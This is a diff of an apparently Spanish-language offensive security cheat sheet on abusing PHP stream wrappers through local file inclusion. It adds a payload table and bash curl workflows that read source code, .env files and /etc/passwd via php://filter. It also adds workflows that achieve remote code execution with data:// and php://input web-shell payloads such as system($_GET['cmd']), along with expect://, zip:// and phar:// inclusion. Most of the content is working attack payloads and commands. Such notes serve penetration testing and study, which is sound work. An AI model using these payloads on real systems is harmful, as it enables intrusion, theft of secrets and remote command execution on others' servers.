@@ -1,17 +1,17 @@
 ---
 aliases:
-  - "Wrappers"
+  - Wrappers
 tags:
   - type/technique
   - vuln/lfi
   - technique/execution
   - asset/web-app
-primary categories:
-secondary categories:
-tertiary categories:
+primary categories: null
+secondary categories: null
+tertiary categories: null
 kind: SubCheatSheet
 linked:
-  - "[[File Inclusion]]"
+  - '[[File Inclusion]]'
 ---
 # LFI - PHP Wrappers
 
@@ -19,25 +19,79 @@ linked:
 
 ## Cheatsheet
 
-|             **Técnica**             |                                   **Descripción**                                    |                              **Payload**                               |
-| :---------------------------------: | :----------------------------------------------------------------------------------: | :--------------------------------------------------------------------: |
-| <br>**php://filter base64**<br><br> |                <br><br>Leer código fuente encodeado en base64<br><br>                |    <br><br>`php://filter/convert.base64-encode/resource=index.php`     |
-|     <br>**php://filter rot13**      |                  <br>Leer código fuente encodeado en ROT13<br><br>                   |          <br>`php://filter/string.rot13/resource=config.php`           |
-|         <br>**php://input**         |        <br>Inyectar código PHP directamente desde el body del request<br><br>        |           <br>`php://input` + POST: `<?php system('id'); ?>`           |
-|           <br>**data://**           |             <br>Inyectar código inline como si fuera un archivo<br><br>              |             <br>`data://text/plain,<?php system('id'); ?>`             |
-|       <br>**data:// base64**        |          <br>Lo mismo pero encodeado en base64 para evadir filtros<br><br>           | <br>`data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==&cmd=ls` |
-|          <br>**expect://**          |        <br>Ejecutar comandos directamente (requiere extensión expect)<br><br>        |                           <br>`expect://id`                            |
-|           <br>**zip://**            |          <br>Incluir un archivo dentro de un ZIP subido al servidor<br><br>          |                 <br>`zip:///tmp/shell.zip%23shell.php`                 |
-|           <br>**phar://**           |               <br>Incluir un archivo dentro de un PHAR subido<br><br>                |                 <br>`phar:///tmp/shell.phar/shell.php`                 |
-|     <br>**php://filter chain**      | <br>Encadenar múltiples filtros de conversión para generar output arbitrario<br><br> |         <br>`php://filter/convert.iconv.UTF8.CSISO2022KR/...`          |
-|           <br>**file://**           |                 <br>Wrapper explícito para archivos locales<br><br>                  |                        <br>`file:///etc/passwd`                        |
+| **Payload** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `php://filter/convert.base64-encode/resource=index.php` | Source PHP en base64 (no se ejecuta) | Lectura segura de archivos PHP. NO requiere `allow_url_include`. |
+| `php://filter/convert.base64-encode/resource=/var/www/html/.env` | `.env` en base64 — bypasea chars XML/binarios | Lectura genérica de archivos con chars problemáticos. |
+| `php://filter/string.rot13/resource=config.php` | Source PHP rot13-encoded | Alt cuando base64 está filtrado por WAF. |
+| `php://filter/read=convert.iconv.UTF8.UTF16LE/resource=file.txt` | Charset conversion como evasión adicional | WAF muy estricto. |
+| `php://input` (body POST con `<?php system('id'); ?>`) | Ejecuta el body POST como PHP | `allow_url_include=On` + endpoint acepta POST. |
+| `data://text/plain,<?php system('id'); ?>` | PHP inline en URI | `allow_url_include=On`. |
+| `data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==` | PHP base64-encoded inline | `allow_url_include=On`. Bypassea filtros de `<?php`. |
+| `expect://id` | Ejecuta `id` directo via expect extension | Extension `expect` instalada (raro). |
+| `zip:///var/www/uploads/payload.zip%23shell.php` | Incluye `shell.php` dentro de ZIP subido | Combo con upload de ZIP. |
+| `phar:///var/www/uploads/payload.phar/index.php` | Incluye + deserializa metadata PHAR | Combo con [[LFI To RCE - Phar Deserialization]]. |
+| `file:///etc/passwd` | Wrapper explícito file:// | Alt cuando paths plain están filtrados. |
+| `php://filter/convert.iconv.UTF-8.CSISO2022KR\|convert.base64-encode/resource=/etc/passwd` | Iconv chain — base de PHP Filter Chains | Building block para [[LFI To RCE - PHP Filter Chains]]. |
 ^lfi-wrappers
 
-***
+### Workflow — read source
+
+```bash
+TARGET="https://target/?page=PAYLOAD"
+
+# Leer source de la app (no se ejecuta)
+PAYLOAD='php://filter/convert.base64-encode/resource=index.php'
+B64=$(curl -s "${TARGET//PAYLOAD/$(python3 -c "import urllib.parse;print(urllib.parse.quote('$PAYLOAD'))")}")
+echo "$B64" | base64 -d
+
+# Iterar archivos comunes
+for f in 'index.php' 'config.php' '.env' 'wp-config.php' 'admin.php'; do
+  echo "=== $f ==="
+  curl -s "${TARGET//PAYLOAD/php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D$f}" | base64 -d 2>/dev/null | head -20
+done
+```
+
+### Workflow — RCE via data://
+
+```bash
+# 1. Confirmar allow_url_include
+PHPINFO_PATH='/etc/php/7.4/apache2/php.ini'
+curl -s "${TARGET//PAYLOAD/php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D$PHPINFO_PATH}" | base64 -d | grep allow_url_include
+
+# 2. Si On → payload data://
+B64=$(echo -n '<?php system($_GET["cmd"]); ?>' | base64)  # PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
+PAYLOAD="data://text/plain;base64,${B64}&cmd=id"
+curl -s "${TARGET//PAYLOAD/$(python3 -c "import urllib.parse;print(urllib.parse.quote('$PAYLOAD'))")}"
+```
+
+### Workflow — RCE via php://input
+
+```bash
+curl -X POST "${TARGET//PAYLOAD/php%3A%2F%2Finput}&cmd=id" \
+  --data '<?php system($_GET["cmd"]); ?>'
+```
+
+### Requisitos por wrapper
+
+| Wrapper | `allow_url_include` | Otras condiciones |
+|:---:|:---:|:---:|
+| `php://filter` | No requiere | Siempre disponible. |
+| `data://` | **Sí** | Bloqueado en stacks modernos. |
+| `php://input` | **Sí** | Endpoint debe aceptar POST. |
+| `expect://` | No requiere | Ext `expect` instalada (raro). |
+| `zip://` / `phar://` | No requiere | Archivo subido al server. |
+| `file://` | No requiere | Equivalente a path plain. |
+
+___
 
 ## Overview
 
-PHP ofrece stream wrappers que permiten acceder a distintos tipos de recursos como si fueran archivos. Cuando un LFI usa funciones como `include()` o `file_get_contents()`, estos wrappers amplían enormemente el alcance del ataque. Con `php://filter` podés leer código fuente sin que se ejecute, con `php://input` y `data://` podés inyectar código directamente, y con `zip://` o `phar://` podés incluir archivos empaquetados que previamente subiste al servidor. La disponibilidad de cada wrapper depende de la configuración de PHP (`allow_url_include`, extensiones instaladas, etc.).
+PHP stream wrappers permiten acceder a recursos como si fueran archivos. `php://filter` es el más útil — lectura segura de cualquier archivo sin ejecución, incluyendo PHP source.
 
+**Estrategia:**
+1. `php://filter/convert.base64-encode/resource=X` para LEER X (no ejecuta).
+2. `data://` o `php://input` para EJECUTAR (requiere `allow_url_include=On`).
+3. Si `allow_url_include=Off` y necesitás RCE → [[LFI To RCE - PHP Filter Chains]] (sin requisitos), [[LFI To RCE - Log Poisoning]], o [[LFI To RCE - Session File Poisoning]].
 
 ***
